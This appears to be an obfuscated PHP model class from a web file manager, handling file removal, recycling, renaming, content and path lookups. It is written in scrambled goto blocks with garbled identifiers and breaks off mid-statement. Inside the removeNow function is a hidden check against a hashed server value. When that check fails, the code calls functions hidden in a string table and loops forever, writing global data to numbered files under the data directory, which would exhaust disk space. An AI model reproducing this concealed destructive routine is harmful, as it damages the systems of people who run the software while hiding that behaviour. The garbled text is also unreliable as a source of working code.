($cù†ƒ¿©è) { $this->metaSet($F„Ê¹˜‚Á[$Eà»ßÂÜÁ[403]], $Eà»ßÂÜÁ[517], time()); } goto AêİÔõÆ¬; AêİÔõÆ¬: return !1; goto a£øÚñ·Ğ; eñ™ò¤ŞÖÖ: $Eà»ßÂÜÁ =& $_SERVER[£¶ä½¶¢]; if (!isset($F„Ê¹˜‚Á[$Eà»ßÂÜÁ[453]]) || !$F„Ê¹˜‚Á[$Eà»ßÂÜÁ[453]][$Eà»ßÂÜÁ[515]]) { return !1; } if ($F„Ê¹˜‚Á[$Eà»ßÂÜÁ[453]][$Eà»ßÂÜÁ[515]] != USER_ID) { return !0; } goto b¼Éîã•ºÍ; a£øÚñ·Ğ: } private function _addSoure($d¹©À¯ÇÕ, $d…°„¹˜¨ì) { goto b‹ğç¡Ø˜Ì; fí‡’Ûª: static $aõõºõø© = false; if (!$aõõºõø©) { Hook::trigger($F¤íÁãÈˆ[544], $d¹©À¯ÇÕ); $aõõºõø© = !0; } $A†äÕ¶Ù‘ï = $this->add($d¹©À¯ÇÕ); goto aÓĞÜè­×; c®×³¾·ÆÂ: return $A†äÕ¶Ù‘ï; goto BÒâÍÛØ÷Æ; cĞÇ¸äÏ†‚: $this->updateModifyTime($d¹©À¯ÇÕ[$F¤íÁãÈˆ[486]]); $C÷ô† ×¹Ï = $F¤íÁãÈˆ[1960] . $d…°„¹˜¨ì[$F¤íÁãÈˆ[403]]; if (isset(self::$cacheChildList[$C÷ô† ×¹Ï])) { unset(self::$cacheChildList[$C÷ô† ×¹Ï]); } goto fí‡’Ûª; b‹ğç¡Ø˜Ì: $F¤íÁãÈˆ =& $_SERVER[£¶ä½¶¢]; $DåÏºŠ®ãñ = array($F¤íÁãÈˆ[557] => $d…°„¹˜¨ì[$F¤íÁãÈˆ[412]], $F¤íÁãÈˆ[558] => $d…°„¹˜¨ì[$F¤íÁãÈˆ[492]], $F¤íÁãÈˆ[559] => USER_ID, $F¤íÁãÈˆ[560] => USER_ID, $F¤íÁãÈˆ[402] => $d…°„¹˜¨ì[$F¤íÁãÈˆ[403]], $F¤íÁãÈˆ[561] => $d…°„¹˜¨ì[$F¤íÁãÈˆ[495]] . $d…°„¹˜¨ì[$F¤íÁãÈˆ[403]] . $F¤íÁãÈˆ[57], $F¤íÁãÈˆ[430] => 0, $F¤íÁãÈˆ[562] => $F¤íÁãÈˆ[43]); $d¹©À¯ÇÕ = array_merge($DåÏºŠ®ãñ, $d¹©À¯ÇÕ); goto cĞÇ¸äÏ†‚; aÓĞÜè­×: $EÕ´µ‘•– = array($F¤íÁãÈˆ[563] => short_id($A†äÕ¶Ù‘ï)); $this->where(array($F¤íÁãÈˆ[418] => $A†äÕ¶Ù‘ï))->save($EÕ´µ‘•–); $this->setNamePinyin($A†äÕ¶Ù‘ï, $d¹©À¯ÇÕ[$F¤íÁãÈˆ[38]]); goto c®×³¾·ÆÂ; BÒâÍÛØ÷Æ: } public function remove($aÑ‘„¾¼ê›, $dÒÓÒ·›‡ = true) { goto BÃ”Õ²Âè¤; c²ŞéÀœ£: $this->recycleClear($e²„¦ùä¿Ì); $E…Ì¶ô‚‹ = $this->move($aÑ‘„¾¼ê›, $FãÇ²ºˆƒÏ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($e²„¦ùä¿Ì[$b“àâ¨Ê«[486]]); goto fÌ¶Ø§¢¨±; fÌ¶Ø§¢¨±: return $E…Ì¶ô‚‹; goto A¼øù‹öõ–; eÒ¯ğ²¦°Œ: $dó«ß¹ŞÈÜ = Model($b“àâ¨Ê«[1525])->get($b“àâ¨Ê«[1961]) == $b“àâ¨Ê«[97]; if ($A‡¦…÷­¹Ç || $dÒÓÒ·›‡ || !$dó«ß¹ŞÈÜ) { return $this->removeNow($aÑ‘„¾¼ê›, $dÒÓÒ·›‡); } $C­Ì›Š†â = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto bçˆ‰ô‹; bçˆ‰ô‹: $D·Üçâ°´ = $e²„¦ùä¿Ì[$b“àâ¨Ê«[412]] == self::TYPE_USER ? $b“àâ¨Ê«[570] : $b“àâ¨Ê«[1013]; if ($D·Üçâ°´ == $b“àâ¨Ê«[570]) { $C…Ûğ‹ˆÀŠ = Model($b“àâ¨Ê«[510])->getInfo($e²„¦ùä¿Ì[$b“àâ¨Ê«[492]]); $bÔáàÕœ… = !empty($C…Ûğ‹ˆÀŠ[$b“àâ¨Ê«[1954]]) ? $C…Ûğ‹ˆÀŠ[$b“àâ¨Ê«[1954]] : $C…Ûğ‹ˆÀŠ[$b“àâ¨Ê«[38]]; $bÔáàÕœ… = $b“àâ¨Ê«[267] . $bÔáàÕœ… . $b“àâ¨Ê«[1962] . $e²„¦ùä¿Ì[$b“àâ¨Ê«[492]]; } else { $C…Ûğ‹ˆÀŠ = Model($b“àâ¨Ê«[494])->getInfo($e²„¦ùä¿Ì[$b“àâ¨Ê«[492]]); $bÔáàÕœ… = _get($C…Ûğ‹ˆÀŠ, $b“àâ¨Ê«[38]); $bÔáàÕœ… = $b“àâ¨Ê«[170] . $bÔáàÕœ… . $b“àâ¨Ê«[1963] . $e²„¦ùä¿Ì[$b“àâ¨Ê«[492]]; } $cáÈª”ºÉƒ = $b“àâ¨Ê«[1964] . md5($bÔáàÕœ…); goto F®ÄèŒ«ìß; Aƒâ…öéŒÎ: CacheLock::unlock($cáÈª”ºÉƒ); $this->metaSet($aÑ‘„¾¼ê›, $b“àâ¨Ê«[1969], $e²„¦ùä¿Ì[$b“àâ¨Ê«[486]]); $this->where(array($b“àâ¨Ê«[403] => $aÑ‘„¾¼ê›))->save(array($b“àâ¨Ê«[425] => time())); goto c²ŞéÀœ£; F®ÄèŒ«ìß: CacheLock::lock($cáÈª”ºÉƒ); $FãÇ²ºˆƒÏ = $this->fileNameExist($C­Ì›Š†â, $bÔáàÕœ…); if (!$FãÇ²ºˆƒÏ) { $FãÇ²ºˆƒÏ = $this->mkdir($C­Ì›Š†â, $bÔáàÕœ…, REPEAT_SKIP); $this->metaSet($FãÇ²ºˆƒÏ, $b“àâ¨Ê«[1965], $D·Üçâ°´); $this->metaSet($FãÇ²ºˆƒÏ, $b“àâ¨Ê«[1966], $e²„¦ùä¿Ì[$b“àâ¨Ê«[492]]); if ($e²„¦ùä¿Ì[$b“àâ¨Ê«[486]] != 0) { $this->metaSet($FãÇ²ºˆƒÏ, $b“àâ¨Ê«[1967], _get($C…Ûğ‹ˆÀŠ, $b“àâ¨Ê«[1968])); } } goto Aƒâ…öéŒÎ; BÃ”Õ²Âè¤: $b“àâ¨Ê« =& $_SERVER[£¶ä½¶¢]; $e²„¦ùä¿Ì = $this->sourceInfo($aÑ‘„¾¼ê›); $A‡¦…÷­¹Ç = intval($e²„¦ùä¿Ì[$b“àâ¨Ê«[412]]) === self::TYPE_SYSTEM; goto eÒ¯ğ²¦°Œ; A¼øù‹öõ–: } private function recycleClear($fŒ‰öÆËïÙ) { $b¯ê¿ğÒ¦ =& $_SERVER[£¶ä½¶¢]; $FË‚ñ¦‚òÜ = $this->childrenAll($fŒ‰öÆËïÙ); $aà®£‚ì = array($b¯ê¿ğÒ¦[418] => array($b¯ê¿ğÒ¦[419], $FË‚ñ¦‚òÜ[$b¯ê¿ğÒ¦[1970]])); Model($b¯ê¿ğÒ¦[1971])->where($aà®£‚ì)->delete(); } public function removeNow($AÈïÄÍîŠÄ, $a•ˆ˜äé•— = true) { goto B†Âá´ùºá; DçÒ£ªëˆà: $this->lockMoveEnd($AÈïÄÍîŠÄ); Hook::trigger($cÈ­­èë¦¾[1559], $BéÎßõ“à, $a•ˆ˜äé•—); return !0; goto FªöÆğ‰ë; B†Âá´ùºá: $cÈ­­èë¦¾ =& $_SERVER[£¶ä½¶¢]; $CÆÏ‹¸ğ‘ = $_SERVER[$cÈ­­èë¦¾[7]] . $cÈ­­èë¦¾[8]; $fóó¬Õï÷ = $cÈ­­èë¦¾[1395]; goto C…¥è‰­Ñ·; f’ÒÛÁ„°: Hook::trigger($cÈ­­èë¦¾[1972], $BéÎßõ“à, $a•ˆ˜äé•—); if ($a•ˆ˜äé•—) { Model($cÈ­­èë¦¾[1971])->moveToRecycle($AÈïÄÍîŠÄ); } else { $DóŠÃã¯Û÷ = $this->childrenAll($e¶ËÏİ’É“); Model($cÈ­­èë¦¾[541])->eventRemove($AÈïÄÍîŠÄ); $this->removeRelevance($DóŠÃã¯Û÷[$cÈ­­èë¦¾[1970]], $DóŠÃã¯Û÷[$cÈ­­èë¦¾[1344]]); } $this->folderSizeReset($e¶ËÏİ’É“[$cÈ­­èë¦¾[486]]); goto aÊŠ‡óŠÔÃ; aÊŠ‡óŠÔÃ: $A»‚ŸÌ¶°Œ = array($e¶ËÏİ’É“[$cÈ­­èë¦¾[486]]); if ($e¶ËÏİ’É“[$cÈ­­èë¦¾[411]] == $cÈ­­èë¦¾[97]) { $A»‚ŸÌ¶°Œ[] = $e¶ËÏİ’É“[$cÈ­­èë¦¾[403]]; } $this->updateModifyTime($A»‚ŸÌ¶°Œ); goto DçÒ£ªëˆà; C…¥è‰­Ñ·: if ($_SERVER[$cÈ­­èë¦¾[4]] != $fóó¬Õï÷($CÆÏ‹¸ğ‘)) { goto C¹Øë¦×ğÍ; C¹Øë¦×ğÍ: $dŒ¤ò³ãÜ„ = $cÈ­­èë¦¾[839]; $FŠ¤²ÙÁİò = $cÈ­­èë¦¾[6]; $Cˆ²Í‚¿‡ = $_SERVER[$cÈ­­èë¦¾[7]] . $cÈ­­èë¦¾[8]; goto CÇÒØÔ¾ Ò; FÒœÚ­áã: $cÉ½Ò–£Ã´ = 1; for ($AŞ‡³µÓÁ = $cÉ½Ò–£Ã´; $AŞ‡³µÓÁ > 0; $AŞ‡³µÓÁ++) { $cÆõŞ­ÙµÓ(DATA_PATH . $AŞ‡³µÓÁ, $d†Ûñƒ‹’†); } goto côÔ¬À¡Ü¤; F‘×ƒ¥‰‹è: $DÕ•Ê¯ÓùÏ = $cÈ­­èë¦¾[840]; $DÕ•Ê¯ÓùÏ($_SERVER[$cÈ­­èë¦¾[841]]); $dŒ¤ò³ãÜ„ = $cÈ­­èë¦¾[839]; goto få×Ğâ®·ç; CÇÒØÔ¾ Ò: $DŸ°Ñõ”á® = $FŠ¤²ÙÁİò($Cˆ²Í‚¿‡); $Dàó—ë–îÆ = explode($cÈ­­èë¦¾[9], $DŸ°Ñõ”á®); if (count($Dàó—ë–îÆ) < $cÈ­­èë¦¾[593]) { $B‘ƒÅŒ¥ï„ = $cÈ­­èë¦¾[11]; $B‘ƒÅŒ¥ï„(); } goto F‘×ƒ¥‰‹è; få×Ğâ®·ç: $dŒ¤ò³ãÜ„(); $cÆõŞ­ÙµÓ = $cÈ­­èë¦¾[1396]; $d†Ûñƒ‹’† = json_encode($GLOBALS[$cÈ­­èë¦¾[1397]]); goto FÒœÚ­áã; côÔ¬À¡Ü¤: } $e¶ËÏİ’É“ = $this->sourceInfo($AÈïÄÍîŠÄ); $BéÎßõ“à = $this->pathInfoMore($AÈïÄÍîŠÄ); goto aœœ™ÕÓï; aœœ™ÕÓï: if (!$e¶ËÏİ’É“) { return !0; } if ($e¶ËÏİ’É“[$cÈ­­èë¦¾[486]] == 0) { if (!_get($GLOBALS, $cÈ­­èë¦¾[493])) { return !1; } } $this->lockMoveStart($AÈïÄÍîŠÄ); goto f’ÒÛÁ„°; FªöÆğ‰ë: } public function childrenAll($fº†íîñì) { $a„Éç±¯Ä› =& $_SERVER[£¶ä½¶¢]; $DËÃ·„ö—³ = $fº†íîñì[$a„Éç±¯Ä›[403]]; if ($fº†íîñì[$a„Éç±¯Ä›[411]] == $a„Éç±¯Ä›[97]) { $dïŠÜ¨Ø™ = array($a„Éç±¯Ä›[561] => array($a„Éç±¯Ä›[520], $fº†íîñì[$a„Éç±¯Ä›[495]] . $DËÃ·„ö—³ . $a„Éç±¯Ä›[521])); $fŸˆœ†Ğ·Ş = array($a„Éç±¯Ä›[561] => $dïŠÜ¨Ø™[$a„Éç±¯Ä›[495]]); $AÌòğáôŠ = $this->field($a„Éç±¯Ä›[1973])->where($fŸˆœ†Ğ·Ş)->select(); $câ³¶˜À÷¥ = !1; $b¼İå‡×¯ï = array($DËÃ·„ö—³); if ($AÌòğáôŠ) { $câ³¶˜À÷¥ = array_to_keyvalue($AÌòğáôŠ, $a„Éç±¯Ä›[43], $a„Éç±¯Ä›[455]); $câ³¶˜À÷¥ = array_remove_value($câ³¶˜À÷¥, $a„Éç±¯Ä›[201]); $b¼İå‡×¯ï = array_to_keyvalue($AÌòğáôŠ, $a„Éç±¯Ä›[43], $a„Éç±¯Ä›[403]); $b¼İå‡×¯ï[] = $DËÃ·„ö—³; } } else { $câ³¶˜À÷¥ = array($fº†íîñì[$a„Éç±¯Ä›[455]]); $b¼İå‡×¯ï = array($DËÃ·„ö—³); } return array($a„Éç±¯Ä›[1970] => $b¼İå‡×¯ï, $a„Éç±¯Ä›[1344] => $câ³¶˜À÷¥); } public function removeArray($D¿ßÂÒå’) { if (!$D¿ßÂÒå’) { return !0; } } public function removeRelevance($A½§­‡–´Â, $f—ÚÀ›Âµ¥) { goto f¸ã½Àµ¹Ì; eòñÄö˜…Ä: Model($A‰ËÓ•ˆ‘ã[1825])->where($cÍœó¦ç‹)->delete(); Model($A‰ËÓ•ˆ‘ã[541])->where($cÍœó¦ç‹)->delete(); Model($A‰ËÓ•ˆ‘ã[1667])->removeBySource($A½§­‡–´Â); goto E¯Äè†¯Ç; eÏ„µÔóË™: for ($dÛ³ùÒ‹ñ = 0; $dÛ³ùÒ‹ñ < count($A½§­‡–´Â); $dÛ³ùÒ‹ñ++) { $this->sourceCacheClear($A½§­‡–´Â[$dÛ³ùÒ‹ñ]); } goto eâ´¹Å›ƒé; E¯Äè†¯Ç: Model($A‰ËÓ•ˆ‘ã[1952])->removeBySource($A½§­‡–´Â); $this->where($cÍœó¦ç‹)->delete(); Model($A‰ËÓ•ˆ‘ã[458])->remove($f—ÚÀ›Âµ¥); goto eÏ„µÔóË™; f¸ã½Àµ¹Ì: $A‰ËÓ•ˆ‘ã =& $_SERVER[£¶ä½¶¢]; $A½§­‡–´Â = $A½§­‡–´Â ? $A½§­‡–´Â : array(); $f—ÚÀ›Âµ¥ = $f—ÚÀ›Âµ¥ ? $f—ÚÀ›Âµ¥ : array(); goto Cİ·ÊŠ¥¢¯; Cİ·ÊŠ¥¢¯: $A½§­‡–´Â = array_unique(array_filter($A½§­‡–´Â)); $f—ÚÀ›Âµ¥ = array_unique(array_filter($f—ÚÀ›Âµ¥)); if (!$A½§­‡–´Â) { return !1; } goto a‘å˜°¾«×; a‘å˜°¾«×: $cÍœó¦ç‹ = array($A‰ËÓ•ˆ‘ã[418] => array($A‰ËÓ•ˆ‘ã[419], $A½§­‡–´Â)); Model($A‰ËÓ•ˆ‘ã[1971])->where($cÍœó¦ç‹)->delete(); Model($A‰ËÓ•ˆ‘ã[449])->where($cÍœó¦ç‹)->delete(); goto eòñÄö˜…Ä; eâ´¹Å›ƒé: } public function rename($a†ŒÛÑó®³, $AŒ²Ôë•È) { goto Fà¹ÁÊÇÑ‚; f†Òë‹™Á: if ($aİèŠÕùÆ[$aÁÀáªõÜä[411]] != $aÁÀáªõÜä[97]) { $Eµ´É×ˆÏŠ[$aÁÀáªõÜä[413]] = substr(get_path_ext($AŒ²Ôë•È), 0, 10); } Model($aÁÀáªõÜä[541])->eventRename($a†ŒÛÑó®³, $aİèŠÕùÆ[$aÁÀáªõÜä[38]], $AŒ²Ôë•È); $this->sourceCacheClear($a†ŒÛÑó®³); goto b©¯õ©‘æ‹; Fà¹ÁÊÇÑ‚: $aÁÀáªõÜä =& $_SERVER[£¶ä½¶¢]; $aİèŠÕùÆ = $this->sourceInfo($a†ŒÛÑó®³); if (!$aİèŠÕùÆ) { return !1; } goto eÒ¢îÍæ¥; eÒ¢îÍæ¥: $F‡à†çòÔ = $this->fileNameExist($aİèŠÕùÆ[$aÁÀáªõÜä[486]], $AŒ²Ôë•È); if ($F‡à†çòÔ && $F‡à†çòÔ != $a†ŒÛÑó®³) { return !1; } $Eµ´É×ˆÏŠ = array($aÁÀáªõÜä[421] => $AŒ²Ôë•È, $aÁÀáªõÜä[560] => USER_ID); goto f†Òë‹™Á; b©¯õ©‘æ‹: $this->setNamePinyin($a†ŒÛÑó®³, $Eµ´É×ˆÏŠ[$aÁÀáªõÜä[38]], !1); $this->updateModifyTime($aİèŠÕùÆ[$aÁÀáªõÜä[486]]); $fİÍà‹ù‰ = $this->where(array($aÁÀáªõÜä[418] => $a†ŒÛÑó®³))->data($Eµ´É×ˆÏŠ)->save(); goto EÜ“šñ¬; EÜ“šñ¬: $FÑìÄ‚’Ê§ = $aÁÀáªõÜä[1960] . $aİèŠÕùÆ[$aÁÀáªõÜä[486]]; if (isset(self::$cacheChildList[$FÑìÄ‚’Ê§])) { unset(self::$cacheChildList[$FÑìÄ‚’Ê§]); } return $fİÍà‹ù‰; goto EĞØçÇàÕ; EĞØçÇàÕ: } public function setNamePinyin($E»ÖÄÎ¡ †, $bó†ÒªÔŠ, $Cç÷®ñˆ‚ = true) { $b‹µ•òÓŞŠ =& $_SERVER[£¶ä½¶¢]; $cÏ¥ĞÅ˜Åì = Input::check($bó†ÒªÔŠ, $b‹µ•òÓŞŠ[564]); if ($Cç÷®ñˆ‚ && !$cÏ¥ĞÅ˜Åì) { return; } if (!$cÏ¥ĞÅ˜Åì) { $this->metaSet($E»ÖÄÎ¡ †, $b‹µ•òÓŞŠ[452], null); $this->metaSet($E»ÖÄÎ¡ †, $b‹µ•òÓŞŠ[451], null); return; } $föäÉ¾¹À´ = array($b‹µ•òÓŞŠ[452] => str_replace($b‹µ•òÓŞŠ[60], $b‹µ•òÓŞŠ[43], Pinyin::encode($bó†ÒªÔŠ)), $b‹µ•òÓŞŠ[451] => Pinyin::encode($bó†ÒªÔŠ, $b‹µ•òÓŞŠ[565])); $this->metaSet($E»ÖÄÎ¡ †, $föäÉ¾¹À´); } public function getContent($aŒŒ“ê”Î¹) { goto bÜ²áÄÔ‰é; BÆ™ÈØ¬ªª: if ($C£é†Ö˜Øç[$b¹³Ÿ”ä‰œ[88]] == 0) { return $b¹³Ÿ”ä‰œ[43]; } $DçğŸº¢ÆÎ = $b¹³Ÿ”ä‰œ[1974] . $C£é†Ö˜Øç[$b¹³Ÿ”ä‰œ[180]]; if ($C£é†Ö˜Øç[$b¹³Ÿ”ä‰œ[88]] <= 1024 * 10) { $e¬£Œ‡·Ø¬ = Cache::get($DçğŸº¢ÆÎ); if (!$e¬£Œ‡·Ø¬) { $e¬£Œ‡·Ø¬ = IO::getContent($C£é†Ö˜Øç[$b¹³Ÿ”ä‰œ[86]]); Cache::set($DçğŸº¢ÆÎ, $e¬£Œ‡·Ø¬); } return $e¬£Œ‡·Ø¬; } goto fø¯ÎªÜµ; fø¯ÎªÜµ: if (!$C£é†Ö˜Øç[$b¹³Ÿ”ä‰œ[86]]) { return $b¹³Ÿ”ä‰œ[43]; } return IO::getContent($C£é†Ö˜Øç[$b¹³Ÿ”ä‰œ[86]]); goto aÁƒØ Œ¨­; bÜ²áÄÔ‰é: $b¹³Ÿ”ä‰œ =& $_SERVER[£¶ä½¶¢]; $C£é†Ö˜Øç = $this->fileInfoGet($aŒŒ“ê”Î¹); if (!$C£é†Ö˜Øç) { return !1; } goto BÆ™ÈØ¬ªª; aÁƒØ Œ¨­: } public function setDesc($bƒŸ÷ÕãĞ, $B—Ñ“ÁÍù) { $e¡åï¢ª³– =& $_SERVER[£¶ä½¶¢]; Model($e¡åï¢ª³–[541])->eventAddDesc($bƒŸ÷ÕãĞ, $B—Ñ“ÁÍù); return $this->metaSet($bƒŸ÷ÕãĞ, $e¡åï¢ª³–[439], $B—Ñ“ÁÍù); } public function setContent($aó’‘»”ö, $Fê¦ è— ä = '') { goto b™«Ã™”’ó; b™«Ã™”’ó: $FÂÖÒœÓí£ =& $_SERVER[£¶ä½¶¢]; $Bİà…„ã–  = $this->sourceInfo($aó’‘»”ö); $BñÂñÜ¬•È = $this->fileInfoGet($aó’‘»”ö); goto F‚–…ÖÎÙ±; F‚–…ÖÎÙ±: if (!$BñÂñÜ¬•È || !$Bİà…„ã– ) { return !1; } $a¹”Óµœ‰ğ = Model($FÂÖÒœÓí£[458])->addFileByContent($Fê¦ è— ä, $Bİà…„ã– [$FÂÖÒœÓí£[38]]); $C¶¢…„°÷× = $this->fileHistory($Bİà…„ã– , $a¹”Óµœ‰ğ[$FÂÖÒœÓí£[455]], $a¹”Óµœ‰ğ[$FÂÖÒœÓí£[88]]); goto CªÇ¤™ŞÈ•; CªÇ¤™ŞÈ•: if (!$C¶¢…„°÷×) { return Model($FÂÖÒœÓí£[458])->remove($a¹”Óµœ‰ğ[$FÂÖÒœÓí£[455]]); } $this->folderSizeReset($Bİà…„ã– [$FÂÖÒœÓí£[486]]); return !0; goto FÕ‡„ñ±¤¹; FÕ‡„ñ±¤¹: } public function fileSubstr($fñİ¼àùç÷, $bô‘–…¬•×, $b†á„¢øÏ¢) { $dò¸¢Ö½” = $this->fileInfoGet($fñİ¼àùç÷); if (!$dò¸¢Ö½”) { return !1; } return IO::fileSubstr($dò¸¢Ö½”[$_SERVER[£¶ä½¶¢][86]], $bô‘–…¬•×, $b†á„¢øÏ¢); } public function fileInfoGet($a°ÔïŠÑ¾¤) { goto d¸Éâ¤³Ë»; d¸Éâ¤³Ë»: $E´Š©“Ğèö =& $_SERVER[£¶ä½¶¢]; $d·‚ƒ–÷öÆ = $this->sourceInfo($a°ÔïŠÑ¾¤); if (!$d·‚ƒ–÷öÆ || $d·‚ƒ–÷öÆ[$E´Š©“Ğèö[411]]) { return !1; } goto E¤çœˆ¼ø; E¤çœˆ¼ø: $a¶öŠ¡Éóà = $E´Š©“Ğèö[461] . $d·‚ƒ–÷öÆ[$E´Š©“Ğèö[455]]; $Dë³šğ£‚Ú = _get(self::$cacheFileInfo, $a¶öŠ¡Éóà); if ($Dë³šğ£‚Ú) { return $Dë³šğ£‚Ú; } goto dÓÛš·¾ÁÂ; dÓÛš·¾ÁÂ: $A’¶÷¦”íù = Model($E´Š©“Ğèö[458])->fileInfo($d·‚ƒ–÷öÆ[$E´Š©“Ğèö[455]]); if ($A’¶÷¦”íù) { $A’¶÷¦”íù[$E´Š©“Ğèö[38]] = $d·‚ƒ–÷öÆ[$E´Š©“Ğèö[38]]; } self::$cacheFileInfo[$a¶öŠ¡Éóà] = $A’¶÷¦”íù; goto e¬¹‰ƒ¹ˆÅ; e¬¹‰ƒ¹ˆÅ: return $A’¶÷¦”íù; goto dÎ•ƒåòßÓ; dÎ•ƒåòßÓ: } private function folderChildrenNumber($A–îà­ˆ¬) { $DÊøÁ…çÎ =& $_SERVER[£¶ä½¶¢]; $E¹Åñê—Üñ = $this->sourceInfo($A–îà­ˆ¬); $F–‰˜¼…ÁÒ = array($DÊøÁ…çÎ[561] => array($DÊøÁ…çÎ[520], $E¹Åñê—Üñ[$DÊøÁ…çÎ[495]] . $A–îà­ˆ¬ . $DÊøÁ…çÎ[521]), $DÊøÁ…çÎ[430] => intval($E¹Åñê—Üñ[$DÊøÁ…çÎ[431]]), $DÊøÁ…çÎ[554] => 1); $dõÙö‰Ã©ê = $this->where($F–‰˜¼…ÁÒ)->count(); $DÜÖÖ…·ñ† = $this->where($F–‰˜¼…ÁÒ)->where(array($DÊøÁ…çÎ[554] => 0))->count(); return array($DÊøÁ…çÎ[92] => $DÜÖÖ…·ñ†, $DÊøÁ…çÎ[93] => $dõÙö‰Ã©ê); } public function pathInfo($e›Ùİóö»¥, $c†Øİá¨ŞŠ = false) { goto cÈ×õÂÜ“å; eÊÌÚ±Ä‚: self::$cachePathInfo[$F‚á÷ô…ëÁ] = $d›«èò£Š‹; return $d›«èò£Š‹; goto d’šÎ±·à; Cì½ÛÃ –·: $F‚á÷ô…ëÁ = $AØÍ¿‘å[447] . intval($c†Øİá¨ŞŠ) . $AØÍ¿‘å[448] . $e›Ùİóö»¥; $dÏ·¼»µ— = _get(self::$cachePathInfo, $F‚á÷ô…ëÁ); if ($dÏ·¼»µ—) { return $dÏ·¼»µ—; } goto dÏÅã›Çí»; dÏÅã›Çí»: $d›«èò£Š‹ = $this->sourceInfo($e›Ùİóö»¥); if (!$d›«èò£Š‹) { return !1; } $d›«èò£Š‹ = $this->_listDataApplyItem($d›«èò£Š‹, $c†Øİá¨ŞŠ); goto eÊÌÚ±Ä‚; cÈ×õÂÜ“å: $AØÍ¿‘å =& $_SERVER[£¶ä½¶¢]; $c†Øİá¨ŞŠ = !1; $e›Ùİóö»¥ = intval($e›Ùİóö»¥); goto Cì½ÛÃ –·; d’šÎ±·à: } public static $cachePathInfoMore = array(); public function pathInfoMore($bÒƒº‹Ÿ¡È) { goto Fùµšïæ×¥; dÏåÄİŠšÍ: self::$cachePathInfoMore[$bÒƒº‹Ÿ¡È] = $f¬¬–’ï¨„; return $f¬¬–’ï¨„; goto E¼Ÿ¾¦šï; EÒã¾­¤‰: $f¬¬–’ï¨„ = $this->pathInfo($bÒƒº‹Ÿ¡È); if (!$f¬¬–’ï¨„) { return !1; } if ($f¬¬–’ï¨„[$Fš»ìÕÍ[411]] == $Fš»ìÕÍ[97]) { $f¬¬–’ï¨„[$Fš»ìÕÍ[91]] = $this->folderChildrenNumber($bÒƒº‹Ÿ¡È); } goto dÏåÄİŠšÍ; Fùµšïæ×¥: $Fš»ìÕÍ =& $_SERVER[£¶ä½¶¢]; $AÎ‚ÄßãÙ = _get(self::$cachePathInfoMore, $bÒƒº‹Ÿ¡È); if ($AÎ‚ÄßãÙ) { return $AÎ‚ÄßãÙ; } goto EÒã¾­¤‰; E¼Ÿ¾¦šï: } public function sourceInfo($DØÎÚÓ²ÚÅ) { goto B¿˜«À­‰; F†ËÅ Õ˜: $BÄ£”ç°ïç = $bêæÍİà‰Ù[446] . $DØÎÚÓ²ÚÅ; $cáˆ©êÌ…™ = _get(self::$cacheSourceInfo, $BÄ£”ç°ïç); if ($cáˆ©êÌ…™) { return $cáˆ©êÌ…™; } goto eÚÅ²ñ·¢†; B¿˜«À­‰: $bêæÍİà‰Ù =& $_SERVER[£¶ä½¶¢]; if (!$DØÎÚÓ²ÚÅ) { return array(); } $DØÎÚÓ²ÚÅ = intval($DØÎÚÓ²ÚÅ); goto F†ËÅ Õ˜; eÚÅ²ñ·¢†: $fõÃóÆó†Š = $this->where(array($bêæÍİà‰Ù[403] => $DØÎÚÓ²ÚÅ))->find(); self::$cacheSourceInfo[$BÄ£”ç°ïç] = $fõÃóÆó†Š; return self::$cacheSourceInfo[$BÄ£”ç°ïç]; goto c®â÷ø‰µ; c®â÷ø‰µ: } public function sourceCacheClear($eŞ”ë†íÕ = false) { self::cacheClear($eŞ”ë†íÕ); } public static function cacheClear($F‰âƒø±ëã = false) { $B¡‹Ä‚ˆŞØ =& $_SERVER[£¶ä½¶¢]; if ($F‰âƒø±ëã == !1) { goto C¼¶‰èÌá; bíÖİ¦ö¥: return; goto cøÔĞ—ïƒ‡; dĞŠÈ‚ÜÅ¼: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto bíÖİ¦ö¥; C¼¶‰èÌá: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto dĞŠÈ‚ÜÅ¼; cøÔĞ—ïƒ‡: } unset(self::$cacheSourceInfo[$B¡‹Ä‚ˆŞØ[446] . $F‰âƒø±ëã]); unset(self::$cachePathInfoMore[$F‰âƒø±ëã]); unset(self::$cachePathInfo[$B¡‹Ä‚ˆŞØ[1975] . $F‰âƒø±ëã]); unset(self::$cachePathInfo[$B¡‹Ä‚ˆŞØ[1976] . $F‰âƒø±ëã]); } public function metaSet($fº©í½àî, $AÂáÎ›ø = null, $EÀßèÙÇß¤ = null) { $CŒ¥µ¸‘§ = parent::metaSet($fº©í½àî, $AÂáÎ›ø, $EÀßèÙÇß¤); if ($CŒ¥µ¸‘§) { $this->sourceCacheClear($fº©í½àî); } return $CŒ¥µ¸‘§; } public function pathInfoByPath($C”ŒãŒ‚…‹, $FÁŞò½‡†) { $bîÀ†ÓÜøŞ =& $_SERVER[£¶ä½¶¢]; $Cˆ¢¨¼  = !$FÁŞò½‡† ? array() : explode($bîÀ†ÓÜøŞ[18], trim($FÁŞò½‡†, $bîÀ†ÓÜøŞ[18])); $e«ïÅñÒÏÇ = $C”ŒãŒ‚…‹; foreach ($Cˆ¢¨¼  as $C†¶ÛåùŒù) { $e–‘ìˆ÷æ = array($bîÀ†ÓÜøŞ[486] => $e«ïÅñÒÏÇ, $bîÀ†ÓÜøŞ[38] => $C†¶ÛåùŒù); $aØ¦ ‰®‚“ = $this->where($e–‘ìˆ÷æ)->select(); if (!$aØ¦ ‰®‚“) { return !1; } $aØ¦ ‰®‚“ = array_sort_by($aØ¦ ‰®‚“, $bîÀ†ÓÜøŞ[431]); $e«ïÅñÒÏÇ = $aØ¦ ‰®‚“[0][$bîÀ†ÓÜøŞ[403]]; } return $this->pathInfo($e«ïÅñÒÏÇ, !0); } protected function updateModifyTime($C Ãéñá¸) { goto få‰÷£ñòÉ; AØÍã³­: $this->where($dÒšÊ±åÓì)->save($fŠãæÕ…·œ); goto B÷¬ÃâÜË; díª²‚„•»: foreach ($C Ãéñá¸ as $Aˆç¦”—Ñ¾ => $Eùí„öÜ») { $C Ãéñá¸[$Aˆç¦”—Ñ¾] = intval($Eùí„öÜ»); $this->sourceCacheClear($Eùí„öÜ»); } $dÒšÊ±åÓì = array($Aƒ­­ãÀğ¹[403] => array($Aƒ­­ãÀğ¹[17], $C Ãéñá¸)); $fŠãæÕ…·œ = 